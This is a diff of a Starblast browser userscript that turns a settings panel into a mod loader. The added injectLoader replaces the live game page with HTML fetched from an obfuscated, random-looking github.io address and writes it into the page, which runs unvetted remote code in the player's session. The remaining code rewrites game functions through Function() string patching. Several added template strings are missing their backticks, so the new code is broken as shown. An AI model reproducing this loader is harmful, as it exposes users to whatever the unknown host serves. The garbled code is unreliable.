@@ -1,505 +1,385 @@
-// Starblast Enhancement Script - Clean UI Version
 (function() {
     'use strict';
+
+    const log = (msg) => console.log(%c[eot] ${msg}, "color: #FF00E6");
     
-    // Configuration object to store all settings
-    const config = {
-        fov: 45,
-        radarZoom: 4,
-        crystalColor: '',
-        backgroundUrl: '',
-        lowercaseEnabled: false,
-        timerEnabled: false
+    // Settings object to store user preferences
+    const settings = {
+        crystalColor: localStorage.getItem('crystal-color') || '#ffffff',
+        emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
+        showBlankBadge: localStorage.getItem('show-blank-badge') === 'true',
+        uiVisible: localStorage.getItem('ui-visible') !== 'false'
     };
-    
-    // Load settings from localStorage
-    function loadSettings() {
-        config.fov = parseInt(localStorage.getItem('sb_fov')) || 45;
-        config.radarZoom = parseInt(localStorage.getItem('sb_radar_zoom')) || 4;
-        config.crystalColor = localStorage.getItem('sb_crystal_color') || '';
-        config.backgroundUrl = localStorage.getItem('sb_background_url') || '';
-        config.lowercaseEnabled = localStorage.getItem('sb_lowercase') === 'true';
-        config.timerEnabled = localStorage.getItem('sb_timer') === 'true';
-    }
-    
+
     // Save settings to localStorage
     function saveSettings() {
-        localStorage.setItem('sb_fov', config.fov);
-        localStorage.setItem('sb_radar_zoom', config.radarZoom);
-        localStorage.setItem('sb_crystal_color', config.crystalColor);
-        localStorage.setItem('sb_background_url', config.backgroundUrl);
-        localStorage.setItem('sb_lowercase', config.lowercaseEnabled);
-        localStorage.setItem('sb_timer', config.timerEnabled);
+        localStorage.setItem('crystal-color', settings.crystalColor);
+        localStorage.setItem('emote-capacity', settings.emoteCapacity.toString());
+        localStorage.setItem('show-blank-badge', settings.showBlankBadge.toString());
+        localStorage.setItem('ui-visible', settings.uiVisible.toString());
     }
-    
-    // Create the UI
+
+    // Create UI Panel
     function createUI() {
-        const ui = document.createElement('div');
-        ui.id = 'starblast-enhancer';
-        ui.innerHTML = `
-            <div id="sb-panel" style="
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                background: rgba(0, 0, 0, 0.9);
-                border: 2px solid #00ffff;
-                border-radius: 10px;
-                padding: 15px;
-                color: #ffffff;
-                font-family: Arial, sans-serif;
-                font-size: 12px;
-                z-index: 10000;
-                min-width: 250px;
-                box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-                backdrop-filter: blur(5px);
-                display: none;
-            ">
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-                    <h3 style="margin: 0; color: #00ffff; text-shadow: 0 0 10px #00ffff;">Starblast Enhancer</h3>
-                    <button id="sb-close" style="
-                        background: #ff4444;
-                        border: none;
-                        color: white;
-                        width: 20px;
-                        height: 20px;
-                        border-radius: 50%;
-                        cursor: pointer;
-                        font-size: 12px;
-                    ">×</button>
-                </div>
-                
-                <div class="sb-section">
-                    <label style="display: block; margin-bottom: 5px; color: #00ffff;">FOV Control:</label>
-                    <input type="range" id="sb-fov-slider" min="10" max="190" value="${config.fov}" style="width: 100%; margin-bottom: 5px;">
-                    <span id="sb-fov-value" style="color: #ffffff;">${config.fov}°</span>
-                    <div style="margin-top: 5px;">
-                        <input type="checkbox" id="sb-fov-wheel" ${config.fovWheelEnabled ? 'checked' : ''}>
-                        <label for="sb-fov-wheel" style="margin-left: 5px;">Scroll wheel control</label>
-                    </div>
-                </div>
-                
-                <div class="sb-section" style="margin-top: 15px;">
-                    <label style="display: block; margin-bottom: 5px; color: #00ffff;">Crystal Color:</label>
-                    <input type="color" id="sb-crystal-color" value="${config.crystalColor || '#ffffff'}" style="width: 100%; height: 30px; border: none; border-radius: 5px;">
-                    <button id="sb-crystal-reset" style="
-                        width: 100%;
-                        margin-top: 5px;
-                        background: #444;
-                        color: white;
-                        border: 1px solid #666;
-                        padding: 5px;
-                        border-radius: 3px;
-                        cursor: pointer;
-                    ">Reset to Default</button>
-                </div>
-                
-                <div class="sb-section" style="margin-top: 15px;">
-                    <label style="display: block; margin-bottom: 5px; color: #00ffff;">Background Image:</label>
-                    <input type="url" id="sb-background-url" placeholder="Image URL (.png, .jpg, .gif)" value="${config.backgroundUrl}" style="
-                        width: 100%;
-                        padding: 5px;
-                        border: 1px solid #666;
-                        border-radius: 3px;
-                        background: #333;
-                        color: white;
-                        margin-bottom: 5px;
-                    ">
-                    <div style="display: flex; gap: 5px;">
-                        <button id="sb-bg-apply" style="
-                            flex: 1;
-                            background: #00aa00;
-                            color: white;
-                            border: none;
-                            padding: 5px;
-                            border-radius: 3px;
-                            cursor: pointer;
-                        ">Apply</button>
-                        <button id="sb-bg-remove" style="
-                            flex: 1;
-                            background: #aa0000;
-                            color: white;
-                            border: none;
-                            padding: 5px;
-                            border-radius: 3px;
-                            cursor: pointer;
-                        ">Remove</button>
-                    </div>
-                </div>
-                
-                <div class="sb-section" style="margin-top: 15px;">
-                    <label style="display: block; margin-bottom: 10px; color: #00ffff;">Options:</label>
-                    <div style="margin-bottom: 8px;">
-                        <input type="checkbox" id="sb-radar-zoom" ${config.radarZoom === 1 ? 'checked' : ''}>
-                        <label for="sb-radar-zoom" style="margin-left: 5px;">Enhanced Radar Zoom</label>
-                    </div>
-                    <div style="margin-bottom: 8px;">
-                        <input type="checkbox" id="sb-lowercase" ${config.lowercaseEnabled ? 'checked' : ''}>
-                        <label for="sb-lowercase" style="margin-left: 5px;">Lowercase Names</label>
-                    </div>
-                    <div>
-                        <input type="checkbox" id="sb-timer" ${config.timerEnabled ? 'checked' : ''}>
-                        <label for="sb-timer" style="margin-left: 5px;">Show Timer Widget</label>
-                    </div>
-                </div>
+        const panel = document.createElement('div');
+        panel.id = 'starblast-mod-panel';
+        panel.style.cssText = 
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            width: 300px;
+            background: rgba(20, 20, 20, 0.95);
+            border: 2px solid #06c26d;
+            border-radius: 10px;
+            padding: 15px;
+            font-family: Arial, sans-serif;
+            font-size: 12px;
+            color: #ffffff;
+            z-index: 10000;
+            box-shadow: 0 0 20px rgba(6, 194, 109, 0.3);
+            backdrop-filter: blur(5px);
+            display: ${settings.uiVisible ? 'block' : 'none'};
+        ;
+
+        panel.innerHTML = 
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h3 style="margin: 0; color: #06c26d;">Starblast Enhanced</h3>
+                <button id="minimize-btn" style="background: #06c26d; border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer;">−</button>
             </div>
             
-            <button id="sb-toggle" style="
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                background: rgba(0, 255, 255, 0.8);
-                border: 2px solid #00ffff;
-                color: #000;
-                padding: 8px 12px;
-                border-radius: 5px;
-                cursor: pointer;
-                font-weight: bold;
-                z-index: 10001;
-                font-size: 12px;
-                box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
-            ">SB+</button>
-            
-            <div id="sb-fov-display" style="
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background: rgba(0, 0, 0, 0.8);
-                color: #00ffff;
-                padding: 10px 20px;
-                border-radius: 5px;
-                font-size: 24px;
-                font-weight: bold;
-                z-index: 10000;
-                display: none;
-                border: 2px solid #00ffff;
-                text-shadow: 0 0 10px #00ffff;
-            "></div>
-        `;
-        
-        document.body.appendChild(ui);
-        setupEventListeners();
-    }
-    
-    // Setup FOV hook
-    function setupFOVHook() {
-        // Try to hook into the game's animation/render loop
-        const originalRequestAnimationFrame = window.requestAnimationFrame;
-        
-        window.requestAnimationFrame = function(callback) {
-            return originalRequestAnimationFrame.call(this, function(timestamp) {
-                // Apply FOV before each frame render
-                updateFOV();
-                return callback(timestamp);
-            });
-        };
-        
-        // Also try to hook into common Three.js render methods
-        if (window.THREE && window.THREE.WebGLRenderer) {
-            const originalRender = window.THREE.WebGLRenderer.prototype.render;
-            window.THREE.WebGLRenderer.prototype.render = function(scene, camera) {
-                if (camera && camera.fov !== undefined && config.fov !== 45) {
-                    camera.fov = config.fov;
-                    if (camera.updateProjectionMatrix) {
-                        camera.updateProjectionMatrix();
-                    }
-                }
-                return originalRender.call(this, scene, camera);
-            };
-        }
-        
-        // Set up periodic FOV updates
-        setInterval(() => {
-            if (config.fov !== 45) {
-                updateFOV();
-            }
-        }, 100);
-    }
-    function setupEventListeners() {
-        const panel = document.getElementById('sb-panel');
-        const toggle = document.getElementById('sb-toggle');
-        const close = document.getElementById('sb-close');
-        
-        // Toggle panel
-        toggle.addEventListener('click', () => {
-            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-        });
-        
-        close.addEventListener('click', () => {
-            panel.style.display = 'none';
-        });
-        
-        // FOV controls
-        const fovSlider = document.getElementById('sb-fov-slider');
-        const fovValue = document.getElementById('sb-fov-value');
-        const fovWheel = document.getElementById('sb-fov-wheel');
-        
-        fovSlider.addEventListener('input', (e) => {
-            config.fov = parseInt(e.target.value);
-            fovValue.textContent = config.fov + '°';
-            updateFOV();
-            saveSettings();
-        });
-        
-        fovWheel.addEventListener('change', (e) => {
-            config.fovWheelEnabled = e.target.checked;
-            saveSettings();
-        });
-        
-        // Crystal color
-        const crystalColor = document.getElementById('sb-crystal-color');
-        const crystalReset = document.getElementById('sb-crystal-reset');
-        
-        crystalColor.addEventListener('change', (e) => {
-            config.crystalColor = e.target.value;
-            saveSettings();
-        });
-        
-        crystalReset.addEventListener('click', () => {
-            config.crystalColor = '';
-            crystalColor.value = '#ffffff';
-            saveSettings();
-        });
-        
-        // Background controls
-        const bgUrl = document.getElementById('sb-background-url');
-        const bgApply = document.getElementById('sb-bg-apply');
-        const bgRemove = document.getElementById('sb-bg-remove');
-        
-        bgApply.addEventListener('click', () => {
-            const url = bgUrl.value.trim();
-            if (url && (url.endsWith('.png') || url.endsWith('.jpg') || url.endsWith('.gif'))) {
-                config.backgroundUrl = url;
-                applyBackground();
-                saveSettings();
-            }
-        });
-        
-        bgRemove.addEventListener('click', () => {
-            config.backgroundUrl = '';
-            bgUrl.value = '';
-            removeBackground();
-            saveSettings();
-        });
-        
-        // Options
-        const radarZoom = document.getElementById('sb-radar-zoom');
-        const lowercase = document.getElementById('sb-lowercase');
-        const timer = document.getElementById('sb-timer');
-        
-        radarZoom.addEventListener('change', (e) => {
-            config.radarZoom = e.target.checked ? 1 : 4;
-            saveSettings();
-            location.reload(); // Radar zoom requires reload
-        });
-        
-        lowercase.addEventListener('change', (e) => {
-            config.lowercaseEnabled = e.target.checked;
-            updateLowercase();
-            saveSettings();
-        });
-        
-        timer.addEventListener('change', (e) => {
-            config.timerEnabled = e.target.checked;
-            saveSettings();
-        });
-        
-        // Keyboard shortcuts
-        document.addEventListener('keydown', (e) => {
-            if (e.altKey && e.key === 'e') {
-                e.preventDefault();
-                panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-            }
-            
-            if (e.key === 'F11' && config.fovWheelEnabled) {
-                e.preventDefault();
-                config.fov = 45;
-                fovSlider.value = 45;
-                fovValue.textContent = '45°';
-                updateFOV();
-                showFOVDisplay(45);
-                saveSettings();
-            }
-        });
-        
-        // Mouse wheel FOV control
-        document.addEventListener('wheel', (e) => {
-            if (!config.fovWheelEnabled) return;
-            
-            if (e.deltaY < 0) {
-                config.fov = Math.max(10, config.fov - 1);
+            <div id="panel-content">
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; margin-bottom: 5px;">Crystal Color:</label>
+                    <input type="color" id="crystal-color" value="${settings.crystalColor}" style="width: 100%; height: 35px; border: none; border-radius: 5px; cursor: pointer;">
+                </div>
+                
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; margin-bottom: 5px;">Emote Capacity: <span id="emote-value">${settings.emoteCapacity}</span></label>
+                    <input type="range" id="emote-capacity" min="1" max="10" value="${settings.emoteCapacity}" 
+                           style="width: 100%; background: #333; outline: none; cursor: pointer;">
+                </div>
+                
+                <div style="margin-bottom: 15px;">
+                    <label style="display: flex; align-items: center; cursor: pointer;">
+                        <input type="checkbox" id="show-blank-badge" ${settings.showBlankBadge ? 'checked' : ''} 
+                               style="margin-right: 10px; transform: scale(1.2);">
+                        Show Blank Badges
+                    </label>
+                </div>
+                
+                <div style="text-align: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #333;">
+                    <small style="color: #888;">Lowercase names enabled by default</small>
+                </div>
+            </div>
+        ;
+
+        document.body.appendChild(panel);
+
+        // Add event listeners
+        document.getElementById('minimize-btn').addEventListener('click', () => {
+            const content = document.getElementById('panel-content');
+            const btn = document.getElementById('minimize-btn');
+            if (content.style.display === 'none') {
+                content.style.display = 'block';
+                btn.textContent = '−';
+                settings.uiVisible = true;
             } else {
-                config.fov = Math.min(190, config.fov + 1);
+                content.style.display = 'none';
+                btn.textContent = '+';
+                settings.uiVisible = false;
             }
-            
-            fovSlider.value = config.fov;
-            fovValue.textContent = config.fov + '°';
-            updateFOV();
-            showFOVDisplay(config.fov);
             saveSettings();
-        }, { passive: false });
+        });
+
+        document.getElementById('crystal-color').addEventListener('change', (e) => {
+            settings.crystalColor = e.target.value;
+            saveSettings();
+            log(Crystal color changed to ${settings.crystalColor});
+        });
+
+        document.getElementById('emote-capacity').addEventListener('input', (e) => {
+            settings.emoteCapacity = parseInt(e.target.value);
+            document.getElementById('emote-value').textContent = settings.emoteCapacity;
+            saveSettings();
+            log(Emote capacity changed to ${settings.emoteCapacity});
+        });
+
+        document.getElementById('show-blank-badge').addEventListener('change', (e) => {
+            settings.showBlankBadge = e.target.checked;
+            saveSettings();
+            log(Show blank badges: ${settings.showBlankBadge});
+        });
+
+        // Make panel draggable
+        let isDragging = false;
+        let dragOffset = { x: 0, y: 0 };
+
+        panel.addEventListener('mousedown', (e) => {
+            if (e.target.id === 'minimize-btn' || e.target.type === 'color' || e.target.type === 'range' || e.target.type === 'checkbox') return;
+            isDragging = true;
+            dragOffset.x = e.clientX - panel.offsetLeft;
+            dragOffset.y = e.clientY - panel.offsetTop;
+            panel.style.cursor = 'grabbing';
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            if (!isDragging) return;
+            panel.style.left = (e.clientX - dragOffset.x) + 'px';
+            panel.style.top = (e.clientY - dragOffset.y) + 'px';
+        });
+
+        document.addEventListener('mouseup', () => {
+            isDragging = false;
+            panel.style.cursor = 'default';
+        });
     }
-    
-    // FOV functions
-    function updateFOV() {
-        // Try multiple approaches to set FOV
-        
-        // Method 1: Try to find camera object
-        if (window.lOOI1) {
-            window.lOOI1.fov = config.fov;
-            if (window.lOOI1.updateProjectionMatrix) {
-                window.lOOI1.updateProjectionMatrix();
-            }
-        }
-        
-        // Method 2: Try to find Three.js camera
-        if (window.THREE) {
-            // Look for camera in common locations
-            const possibleCameras = [
-                window.camera,
-                window.scene?.camera,
-                window.game?.camera,
-                window.renderer?.camera
-            ];
-            
-            for (let cam of possibleCameras) {
-                if (cam && cam.fov !== undefined) {
-                    cam.fov = config.fov;
-                    if (cam.updateProjectionMatrix) {
-                        cam.updateProjectionMatrix();
-                    }
-                    break;
-                }
-            }
-        }
-        
-        // Method 3: Try to find camera through object traversal
-        for (let key in window) {
-            try {
-                let obj = window[key];
-                if (obj && typeof obj === 'object' && obj.fov !== undefined) {
-                    obj.fov = config.fov;
-                    if (obj.updateProjectionMatrix) {
-                        obj.updateProjectionMatrix();
-                    }
-                }
-            } catch (e) {
-                // Ignore errors from accessing restricted objects
-            }
-        }
-        
-        // Method 4: Set global FOV value that might be used by the game
-        window.currentFOV = config.fov;
-        window.customFOV = config.fov;
-        
-        // Method 5: Store in common game object patterns
-        if (window.I1000) {
-            window.I1000.currentFOV = config.fov;
-        }
-        if (window.modSettings) {
-            window.modSettings.currentFOV = config.fov;
-            window.modSettings.fovEnabled = true;
-        } else {
-            window.modSettings = {
-                currentFOV: config.fov,
-                fovEnabled: true
-            };
-        }
-    }
-    
-    function showFOVDisplay(value) {
-        const display = document.getElementById('sb-fov-display');
-        display.textContent = value + '°';
-        display.style.display = 'block';
-        setTimeout(() => {
-            display.style.display = 'none';
-        }, 2000);
-    }
-    
-    // Background functions
-    function applyBackground() {
-        const particlesElement = document.getElementById('particles-js');
-        if (particlesElement && config.backgroundUrl) {
-            particlesElement.style.backgroundImage = `url("${config.backgroundUrl}")`;
-            particlesElement.style.backgroundSize = 'cover';
-            particlesElement.style.backgroundPosition = 'center';
-        }
-    }
-    
-    function removeBackground() {
-        const particlesElement = document.getElementById('particles-js');
-        if (particlesElement) {
-            particlesElement.style.backgroundImage = '';
-        }
-    }
-    
-    // Lowercase function
-    function updateLowercase() {
-        const playerInput = document.querySelector('#player input');
-        if (playerInput) {
-            if (config.lowercaseEnabled) {
-                playerInput.style.textTransform = 'lowercase';
-            } else {
-                playerInput.style.textTransform = '';
-            }
-        }
-    }
-    
-    // Crystal color modification
-    function setupCrystalColorMod() {
-        let CrystalObject;
-        
-        // Find the Crystal object
-        for (let i in window) {
-            try {
+
+    // Code injection functions
+    function injectCrystalColorChanger(src) {
+        const crystalCode = 
+            let CrystalObject;
+            for (let i in window) try {
                 let val = window[i];
-                if (typeof val.prototype?.createModel === 'function' && 
-                    val.prototype.createModel.toString().includes('Crystal')) {
+                if ("function" == typeof val.prototype.createModel && val.prototype.createModel.toString().includes("Crystal")) {
                     CrystalObject = val;
                     break;
                 }
             } catch (e) {}
-        }
-        
-        if (CrystalObject) {
-            const oldModel = CrystalObject.prototype.getModelInstance;
-            
-            CrystalObject.prototype.getModelInstance = function() {
-                let result = oldModel.apply(this, arguments);
-                
-                if (config.crystalColor && this.material) {
-                    this.material.color.set(config.crystalColor);
-                }
-                
-                return result;
-            };
-        }
+
+            if (CrystalObject) {
+                let oldModel = CrystalObject.prototype.getModelInstance;
+                CrystalObject.prototype.getModelInstance = function () {
+                    let res = oldModel.apply(this, arguments);
+                    let color = localStorage.getItem("crystal-color") || "#ffffff";
+                    if (color && this.material && this.material.color) {
+                        this.material.color.set(color);
+                    }
+                    return res;
+                };
+            }
+        ;
+        return src + crystalCode;
     }
-    
-    // Initialize everything
-    function init() {
-        loadSettings();
+
+    function injectEmoteCapacityChanger(src) {
+        const emoteCode = 
+            setTimeout(() => {
+                if (window.ChatPanel) {
+                    let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/);
+                    if (globalVal) {
+                        globalVal = globalVal[0];
+                        ChatPanel.prototype.getEmotesCapacity = function () {
+                            let num = parseInt(localStorage.getItem("emote-capacity")) || 4;
+                            try { 
+                                return Math.trunc(Math.min(Math.max(1, num), 10)) || 4;
+                            } catch (e) { 
+                                return 4;
+                            }
+                        };
+                        ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
+                    }
+                }
+            }, 1000);
+        ;
+        return src + emoteCode;
+    }
+
+    function injectBlankBadgeToggle(src) {
+        const badgeCode = 
+            setTimeout(() => {
+                let pattern = /,(\\s*"blank"\\s*!={1,2}\\s*this\\.custom\\.badge)/;
+                let found = false;
+                
+                for (let i in window) try {
+                    let val = window[i].prototype;
+                    for (let j in val) {
+                        let func = val[j];
+                        if ("function" == typeof func && func.toString().match(pattern)) {
+                            val[j] = Function("return " + func.toString().replace(pattern, ", (localStorage.getItem('show-blank-badge') === 'true') || $1"))();
+                            found = true;
+                            if (val.drawIcon) {
+                                val.drawIcon = Function("return " + val.drawIcon.toString().replace(/}\\s*else\\s*{/, '} else if (this.icon !== "blank") {'))();
+                            }
+                            let gl = window[i];
+                            for (let k in gl) {
+                                if ("function" == typeof gl[k] && gl[k].toString().includes(".table")) {
+                                    let oldF = gl[k];
+                                    gl[k] = function () {
+                                        let current = localStorage.getItem('show-blank-badge') === 'true';
+                                        if (this.showBlank !== current) {
+                                            for (let i in this.table) if (i.startsWith("blank")) delete this.table[i];
+                                            this.showBlank = current;
+                                        }
+                                        return oldF.apply(this, arguments);
+                                    };
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {}
+            }, 1500);
+        ;
+        return src + badgeCode;
+    }
+
+    function injectLowercaseNames(src) {
+        const lowercaseCode = 
+            let g = setInterval(function () {
+                try {
+                    let playerInput = document.querySelector(".player-app, #player input");
+                    if (playerInput) {
+                        playerInput.style.textTransform = "none";
+                        clearInterval(g);
+                    }
+                } catch (e) {}
+            }, 100);
+
+            setTimeout(() => {
+                try {
+                    let x = Object.values(Object.values(module.exports.settings).find(v => v && v.mode)).find(v => v && "function" == typeof v.startModdingMode);
+                    if (x && x.startGame) {
+                        x.startGame = Function("return " + x.startGame.toString().replace(/\\.toUpperCase\\(\\)/g, ""))();
+                    }
+                } catch (e) {}
+            }, 2000);
+        ;
+        return src + lowercaseCode;
+    }
+
+    function injectCorrectNames(src) {
+        const namesCode = 
+            setTimeout(() => {
+                try {
+                    if (window.Names && Names.prototype.set) {
+                        let oldNameSet = Names.prototype.set.toString();
+                        let customVal = oldNameSet.match(/=\\s*(\\w+)\\.custom/);
+                        if (customVal) {
+                            customVal = customVal[1];
+                            let a = oldNameSet.match(/\\w+\\s*={2,3}\\s*this\\.(\\w+)\\.[^&]+/);
+                            if (a) {
+                                let globalVal = a[1];
+                                let condition = a[0];
+                                Names.prototype.set = Function("return " + oldNameSet.replace(/return\\s+[^]+?\\)/, "return " + condition + " ? (this." + globalVal + ".player_name = " + customVal + ".player_name, Object.values(this." + globalVal + ").find(function(a) { return a && a.additional_badges }).custom = " + customVal + ".custom || {})"))();
+                            }
+                        }
+                    }
+                } catch (e) {}
+            }, 2500);
+        ;
+        return src + namesCode;
+    }
+
+    // Main injection function
+    function codeInjector(src) {
+        log("Injecting enhanced features...");
         
-        // Wait for DOM to be ready
+        src = injectCrystalColorChanger(src);
+        src = injectEmoteCapacityChanger(src);
+        src = injectBlankBadgeToggle(src);
+        src = injectLowercaseNames(src);
+        src = injectCorrectNames(src);
+        
+        log("All features injected successfully");
+        return src;
+    }
+
+    // Initialize the mod system
+    function initializeMod() {
+        // Initialize the code injectors array if it doesn't exist
+        if (!window.sbCodeInjectors) {
+            window.sbCodeInjectors = [];
+        }
+        
+        // Add our code injector
+        window.sbCodeInjectors.push(codeInjector);
+        
+        // Create UI when document is ready
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', () => {
-                createUI();
-                applyBackground();
-                updateLowercase();
-                setupCrystalColorMod();
-                setupFOVHook();
-            });
+            document.addEventListener('DOMContentLoaded', createUI);
         } else {
             createUI();
-            applyBackground();
-            updateLowercase();
-            setupCrystalColorMod();
-            setupFOVHook();
         }
         
-        console.log('Starblast Enhancer loaded! Press Alt+E to toggle panel.');
+        log("Enhanced mod initialized");
     }
-    
-    // Start the script
-    init();
+
+    // Text shadow color change function
+    function changeTextShadowColor() {
+        // This function can be customized to modify text shadows in the game
+        log("Applying text shadow modifications...");
+        // Add your text shadow modification logic here if needed
+    }
+
+    // Main code injection logic
+    function injectLoader() {
+        if (window.location.pathname !== "/") {
+            log("Injection not needed");
+            return;
+        }
+
+        document.open();
+        document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
+        document.close();
+
+        var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sısm1sösm2k1.html';
+        url += '?_=' + new Date().getTime();
+
+        var xhr = new XMLHttpRequest();
+        log("Fetching custom source...");
+        xhr.open("GET", url);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                var starSRC = xhr.responseText;
+
+                if (starSRC !== undefined) {
+                    log("Source fetched successfully");
+                    const start_time = performance.now();
+                    log("Applying mods...");
+
+                    if (!window.sbCodeInjectors) {
+                        log("No Starblast.io userscripts found to load");
+                    } else {
+                        let error_notified = false;
+                        for (const injector of window.sbCodeInjectors) {
+                            try {
+                                if (typeof injector === "function") starSRC = injector(starSRC);
+                                else {
+                                    log("Injector was not a function");
+                                    console.log(injector);
+                                }
+                            } catch (error) {
+                                if (!error_notified) {
+                                    alert("One of your Starblast.io userscripts failed to load");
+                                    error_notified = true;
+                                }
+                                console.error(error);
+                            }
+                        }
+                    }
+
+                    const end_time = performance.now();
+                    log(Mods applied successfully (${(end_time - start_time).toFixed(0)}ms));
+
+                    // After modifying the starSRC, apply text shadow modification
+                    changeTextShadowColor();
+
+                    // Apply the modified source to the document
+                    document.open();
+                    document.write(starSRC);
+                    document.close();
+                } else {
+                    log("Source fetch failed");
+                    alert("An error occurred while fetching game code");
+                }
+            }
+        };
+
+        xhr.send();
+    }
+
+    // Start the mod
+    initializeMod();
+    setTimeout(injectLoader, 1);
+
 })();
